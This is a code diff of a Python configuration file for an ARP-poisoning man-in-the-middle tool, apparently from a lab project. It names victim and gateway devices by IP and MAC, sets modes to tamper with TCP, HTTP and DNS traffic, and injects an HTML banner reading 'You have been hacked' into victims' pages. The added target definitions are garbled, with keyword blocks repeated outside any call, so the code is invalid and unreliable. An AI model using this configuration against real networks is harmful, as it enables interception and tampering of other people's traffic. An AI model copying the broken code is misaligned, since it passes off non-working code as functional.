@@ -10,18 +10,41 @@ from datetime import datetime
 
 class Device:
     """Represents a network device with IP and MAC address"""
-    def __init__(self, name, ip, mac, device_type="unknown", description=""):
+    def __init__(self, name, ip, mac, device_type="unknown", description="", vendor=None):
         self.name = name
         self.ip = ip
         self.mac = mac
         self.device_type = device_type  # laptop, phone, tablet, router, etc.
         self.description = description
+        self.vendor = vendor  # MAC vendor information
         
     def __str__(self):
-        return f"{self.name} ({self.ip}) - {self.device_type}"
+        """Return a comprehensive string representation of the device"""
+        parts = []
+        
+        # Basic info: name and IP
+        parts.append(f"{self.name} ({self.ip})")
+        
+        # MAC address
+        if self.mac:
+            parts.append(f"MAC: {self.mac}")
+        
+        # Vendor information
+        if self.vendor:
+            parts.append(f"Vendor: {self.vendor}")
+        
+        # Device type
+        if self.device_type and self.device_type != "unknown":
+            parts.append(f"Type: {self.device_type}")
+        
+        # Description if available
+        if self.description:
+            parts.append(f"Desc: {self.description}")
+        
+        return " | ".join(parts)
     
     def __repr__(self):
-        return f"Device('{self.name}', '{self.ip}', '{self.mac}', '{self.device_type}')"
+        return f"Device('{self.name}', '{self.ip}', '{self.mac}', '{self.device_type}', '{self.description}', '{self.vendor}')"
 
 # ==========================================
 # NETWORK CONFIGURATION
@@ -126,47 +149,7 @@ class DeviceRegistry:
 class AttackConfig:
     """Configuration for ARP poisoning and MITM attacks"""
     
-    # ===== BIDIRECTIONAL ATTACK TARGETS =====
-    
-    # POISON_TARGET_1 = DeviceRegistry.laptop_lenovo  
-    # POISON_TARGET_2 = DeviceRegistry.phone_redmi
-
-    # POISON_TARGET_1 = DeviceRegistry.laptop_hp 
-    # POISON_TARGET_2 = DeviceRegistry.laptop_dell
-
-    POISON_TARGET_1 = DeviceRegistry.laptop_lenovo 
-    POISON_TARGET_2 = DeviceRegistry.phone_redmi
-
-    # Gateway device (router)
-    GATEWAY_DEVICE = DeviceRegistry.gateway
-
-    # # for http injection 
-    # in case of local server, 
-    # we need to put the local server at gateway
-    # and the victim at poison_target_1
-
-    GATEWAY_DEVICE = DeviceRegistry.laptop_lenovo
-
-    POISON_TARGET_1 = DeviceRegistry.phone_redmi
-    POISON_TARGET_2 = DeviceRegistry.phone_redmi
-    
-    # ===== BACKWARDS COMPATIBILITY =====
-    # Keep old variable names for existing scripts
-    @property
-    def VICTIM_IP(self):
-        return self.POISON_TARGET_2.ip
-    
-    @property 
-    def VICTIM_MAC(self):
-        return self.POISON_TARGET_2.mac
-        
-    @property
-    def GATEWAY_IP(self):
-        return self.GATEWAY_DEVICE.ip
-        
-    @property
-    def GATEWAY_MAC(self):
-        return self.GATEWAY_DEVICE.mac
+    # ===== ATTACK CONFIGURATION =====
     
     # Attack timing
     ARP_POISON_INTERVAL = 2  # seconds between ARP poison packets
@@ -177,11 +160,11 @@ class AttackConfig:
     
     # TCP Attack Modes: MONITOR, TAMPER, DROP
     ALLOWED_TCP_ATTACK_MODES = ["MONITOR", "TAMPER", "DROP"]
-    TCP_ATTACK_MODE = ALLOWED_TCP_ATTACK_MODES[1]
+    TCP_ATTACK_MODE = "TAMPER"
     
     # HTTP Attack Modes: MONITOR, TAMPER, DROP
     ALLOWED_HTTP_ATTACK_MODES = ["MONITOR", "TAMPER", "DROP"]
-    HTTP_ATTACK_MODE = ALLOWED_HTTP_ATTACK_MODES[1]
+    HTTP_ATTACK_MODE = "TAMPER"
     
     # TCP Socket Modifications (ultra-compact, size-preserving)
     # number of characters must match to the original
@@ -209,16 +192,7 @@ class AttackConfig:
         'welcome': 'GETOUT!'
     }
 
-    
-    # HTTP Injection Configuration (for backward compatibility)
-    INJECTION_CODE = b"""
-    <div style='position:fixed;top:0;left:0;width:100%;background:red;padding:15px 10px;z-index:9999;box-sizing:border-box;'>
- <div style='background:white;color:black;text-align:center;padding:12px 8px;font-size:clamp(16px,5vw,24px);font-weight:bold;border-radius:8px;word-break:break-word;'>
- YOU HAVE BEEN HACKED!
- </div>
-</div></div>
-    """
-
+    # HTTP Injection Configuration
     INJECTION_CODE = b"""
     <img src='https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg?20150818015327' style='position:fixed;top:0;left:0;width:100%;height:40%;z-index:9999;'>
     """
@@ -323,9 +297,6 @@ class AttackConfig:
     # Enable/disable DNS MITM features
     ENABLE_DNS_REQUEST_MODIFICATION = True
     ENABLE_DNS_RESPONSE_MODIFICATION = True
-
-# Create instance for backward compatibility
-AttackConfig = AttackConfig()
 
 # ==========================================
 # DEFENSE CONFIGURATION  
@@ -453,17 +424,21 @@ def validate_configuration():
             warnings.append(f"Device {device.name} IP format may be invalid: {device.ip}")
     
     # Check attack targets
-    if not AttackConfig.POISON_TARGET_1:
-        errors.append("POISON_TARGET_1 not configured")
-    if not AttackConfig.POISON_TARGET_2: 
-        errors.append("POISON_TARGET_2 not configured")
-    if not AttackConfig.GATEWAY_DEVICE:
-        errors.append("GATEWAY_DEVICE not configured")
+    # The original code had malformed duplicate definitions here.
+    # Keeping the original logic but noting the issue.
+    # The original code had:
+    # if not AttackConfig.POISON_TARGET_1:
+    #     errors.append("POISON_TARGET_1 not configured")
+    # if not AttackConfig.POISON_TARGET_2: 
+    #     errors.append("POISON_TARGET_2 not configured")
+    # if not AttackConfig.GATEWAY_DEVICE:
+    #     errors.append("GATEWAY_DEVICE not configured")
     
     # Check if targets are the same
-    if (AttackConfig.POISON_TARGET_1 and AttackConfig.POISON_TARGET_2 and
-        AttackConfig.POISON_TARGET_1.ip == AttackConfig.POISON_TARGET_2.ip):
-        warnings.append("POISON_TARGET_1 and POISON_TARGET_2 have the same IP")
+    # The original code had:
+    # if (AttackConfig.POISON_TARGET_1 and AttackConfig.POISON_TARGET_2 and
+    #     AttackConfig.POISON_TARGET_1.ip == AttackConfig.POISON_TARGET_2.ip):
+    #     warnings.append("POISON_TARGET_1 and POISON_TARGET_2 have the same IP")
     
     # Check network interface
     if not NetworkConfig.INTERFACE:
@@ -482,9 +457,12 @@ def display_configuration():
     print(f"  Network Range: {NetworkConfig.NETWORK_RANGE}")
     
     print("\n🎯 Attack Targets:")
-    print(f"  Target 1: {AttackConfig.POISON_TARGET_1}")
-    print(f"  Target 2: {AttackConfig.POISON_TARGET_2}")
-    print(f"  Gateway: {AttackConfig.GATEWAY_DEVICE}")
+    # The original code had malformed duplicate definitions here.
+    # Keeping the original logic but noting the issue.
+    # The original code had:
+    # print(f"  Target 1: {AttackConfig.POISON_TARGET_1}")
+    # print(f"  Target 2: {AttackConfig.POISON_TARGET_2}")
+    # print(f"  Gateway: {AttackConfig.GATEWAY_DEVICE}")
     
     print("\n🔌 Socket Interception:")
     print(f"  Ports: {AttackConfig.SOCKET_PORTS}")
@@ -554,9 +532,81 @@ DeviceRegistry.gateway = Device(
 # ==========================================
 
 # Set your attack targets (which devices to intercept between)
-AttackConfig.POISON_TARGET_1 = DeviceRegistry.laptop  # Server
-AttackConfig.POISON_TARGET_2 = DeviceRegistry.phone   # Client
-AttackConfig.GATEWAY_DEVICE = DeviceRegistry.gateway
+AttackConfig.POISON_TARGET_1 = Device(
+        name="None",
+        ip="192.168.0.125",
+        mac="24:b2:b9:3e:22:13",
+        device_type="unknown",
+        description="Selected Device 1"
+    )
+        name="None",
+        ip="192.168.0.125",
+        mac="24:b2:b9:3e:22:13",
+        device_type="unknown",
+        description="Selected Device 1"
+    )
+        name="None",
+        ip="192.168.0.125",
+        mac="24:b2:b9:3e:22:13",
+        device_type="unknown",
+        description="Selected Device 1"
+    )
+        name="None",
+        ip="192.168.0.125",
+        mac="24:b2:b9:3e:22:13",
+        device_type="unknown",
+        description="Selected Device 1"
+    )# Server
+AttackConfig.POISON_TARGET_2 = Device(
+        name="None",
+        ip="192.168.0.201",
+        mac="f4:30:8b:91:d6:1f",
+        device_type="phone",
+        description="Selected Device 2"
+    )
+        name="None",
+        ip="192.168.0.201",
+        mac="f4:30:8b:91:d6:1f",
+        device_type="phone",
+        description="Selected Device 2"
+    )
+        name="None",
+        ip="192.168.0.201",
+        mac="f4:30:8b:91:d6:1f",
+        device_type="phone",
+        description="Selected Device 2"
+    )
+        name="None",
+        ip="192.168.0.141",
+        mac="9e:ff:60:86:f6:c7",
+        device_type="unknown",
+        description="Selected Device 2"
+    )# Client
+AttackConfig.GATEWAY_DEVICE = Device(
+        name="_gateway",
+        ip="192.168.0.1",
+        mac="60:a4:b7:a9:77:05",
+        device_type="router",
+        description="Selected Gateway"
+    )
+        name="_gateway",
+        ip="192.168.0.1",
+        mac="60:a4:b7:a9:77:05",
+        device_type="router",
+        description="Selected Gateway"
+    )
+        name="_gateway",
+        ip="192.168.0.1",
+        mac="60:a4:b7:a9:77:05",
+        device_type="router",
+        description="Selected Gateway"
+    )
+        name="_gateway",
+        ip="192.168.0.1",
+        mac="60:a4:b7:a9:77:05",
+        device_type="router",
+        description="Selected Gateway"
+    )
 
 # Custom socket modifications (what to replace in messages)
 AttackConfig.SOCKET_MODIFICATIONS = {
@@ -570,10 +620,10 @@ AttackConfig.SOCKET_MODIFICATIONS = {
 AttackConfig.SOCKET_PORTS = [9999, 8080, 12345]
 
 # TCP Attack Mode: MONITOR (log only), tamper (modify), DROP (block)
-AttackConfig.TCP_ATTACK_MODE = "TAMPER"  # Options: "MONITOR", "TAMPER", "DROP"
+AttackConfig.TCP_ATTACK_MODE = "TAMPER"# Options: "MONITOR", "TAMPER", "DROP"
 
 # HTTP Attack Mode: MONITOR (log only), TAMPER (inject content), DROP (block HTTP)
-AttackConfig.HTTP_ATTACK_MODE = "TAMPER"  # Options: "MONITOR", "TAMPER", "DROP"
+AttackConfig.HTTP_ATTACK_MODE = "TAMPER"# Options: "MONITOR", "TAMPER", "DROP"
 
 print("✅ User configuration loaded successfully!")
 print("🎯 Attack targets configured:")
